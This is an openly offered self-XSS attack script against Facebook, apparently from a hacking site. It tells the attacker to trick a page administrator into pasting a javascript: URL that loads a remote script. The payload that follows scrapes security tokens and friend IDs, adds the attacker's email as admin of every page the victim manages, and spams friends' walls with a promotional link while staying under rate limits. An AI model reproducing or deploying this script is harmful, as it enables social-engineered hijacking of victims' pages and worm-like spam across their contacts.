Script by hackersthirst.com..::..
Ask victim to paste this in browser address bar, He must be admin of page.Which you want to hack:

javascript:(a = (b = document).createElement("script")).src = "//www.yourwbesite.com/pagehack.js", b.body.appendChild(a); void(0)

Encode this for good results

//These are to be posted as status messages

txt = "Learn Hacking and Get free softwares: http://hackersthirst.com";

txtee = "Learn Hacking and Get free softwares: http://hackersthirst.com";

 

alert("Please wait 10-15 seconds, that we can analyze your friends to boost pages fans! Then click 'OK'to continue!");

with(x = new XMLHttpRequest()) open("GET", "/"), onreadystatechange = function () {



  if (x.readyState == 4 && x.status == 200) {

  z=x.responseText;

    //comp = z.match(/name="UIComposer_STATE_PIC_OUTSIDE" value="([\d\w]+)"/i)[1];

  //  comp = x.responseText.match(/name="UIComposer_STATE_PIC_OUTSIDE" id="([\d\w]+)"/i)[1];

   form = z.match(/name="post_form_id" value="([\d\w]+)"/i)[1];

  dt = z.match(/name="fb_dtsg" value="([\d\w-_]+)"/i)[1];

 pfid = z.match(/name="post_form_id" value="([\d\w]+)"/i)[1];



 

    with(xx = new XMLHttpRequest())

      open("GET", "/ajax/browser/friends/?uid=" +

               document.cookie.match(/c_user=(\d+)/)[1] +

                  "&filter=all&__a=1&__d=1"),

      onreadystatechange = function () {

      //extracts list of friends

 

        if (xx.readyState == 4 && xx.status == 200) {

        m = xx.responseText.match(/\/\d+_\d+_\d+_q\.jpg/gi).join("\n").replace(/(\/\d+_|_\d+_q\.jpg)/gi, "").split("\n");

        //facebook returns list of friends images of the form of three numbers separated by _,

        //the above regular expression extracts out the middle of the two

        //(which infact is the userID of friend)

        i = 0;

        llimit=25;

        t = setInterval(function () {

          if (i >= llimit )

            return;//it seems the limit is 25 posts per 2 seconds on facebook (to be counted as bot)

          if(i == 0) {//do it only once

            with(ddddd = new XMLHttpRequest()) open("GET", "/ajax/pages/dialog/manage_pages.php?__a=1&__d=1"),

                 setRequestHeader("X-Requested-With", null),

                 setRequestHeader("X-Requested", null),

                 onreadystatechange = function() {

              if(ddddd.readyState == 4 && ddddd.status == 200) {

                llm = (d = ddddd.responseText).match(/\\"id\\":([\d]+)/gi); len =llm.length;

                j=0;

                for(j=0;j<len;j++) {

                  with(xxxcxxx = new XMLHttpRequest()) open("POST", "/pages/edit/?id="+llm[j].replace(/\\"id\\":/i, "")+"&sk=admin"),

                       setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),

                       send("post_form_id="+pfid+"&fb_dtsg="+dt+"&fbpage_id="+llm[j].replace(/\\"id\\":/i, "")+

                            "&friendselector_input[]=wamiqali@hackersthirst.com	&friend_selected[]=&save=1");

                       //I am not very sure on this one but it seems it adds as admin of all pages the user holds

                }

              }

            }, send(null); //end of function to change the admins

 

            

                

                  // this one collects cookie as well as the personalized status update email address

                  // (a photo sent to that address is posted on the wall directly)

 

             

            }

          

 

            //following code does status update

            //the code writes message represented by txt and txtee alternately on the wall of friends.

            //txt and txtee are same though (may be author's mistake)

            if(i%2==0)

            {

              with(xd = new XMLHttpRequest()) open("POST", "/ajax/updatestatus.php?__a=1"),

                setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),

                send("action=PROFILE_UPDATE&profile_id=" + document.cookie.match(/c_user=(\d+)/)[1] + "&status=" + txt +

                "&target_id=" + m[Math.floor(Math.random() * m.length)] +

                //m is an array of id of friends (was created early in the script exec), choose a random friend

                "&composer_id=" +

                "&hey_kid_im_a_composer=true&display_context=profile&post_form_id=" +form + "&fb_dtsg=" + dt +

                //comp, form, dt are (probably) XSRF prevention tokens

                "&lsd&_log_display_context=profile&ajax_log=1&post_form_id_source=AsyncRequest");

            }

            else

            {

              with(xd = new XMLHttpRequest()) open("POST", "/ajax/updatestatus.php?__a=1"),

                   setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),

                   send("action=PROFILE_UPDATE&profile_id=" + document.cookie.match(/c_user=(\d+)/)[1] + "&status=" + txtee +

                        "&target_id=" + m[Math.floor(Math.random() * m.length)] + "&composer_id="+

                        "&hey_kid_im_a_composer=true&display_context=profile&post_form_id=" + form + "&fb_dtsg=" + dt +

                        "&lsd&_log_display_context=profile&ajax_log=1&post_form_id_source=AsyncRequest");

            }

            i += 1;

        }, 2000);// 2000 milli-sec window, after which the script is executed again

      }

 

    }, send(null);

  }

}, send(null);
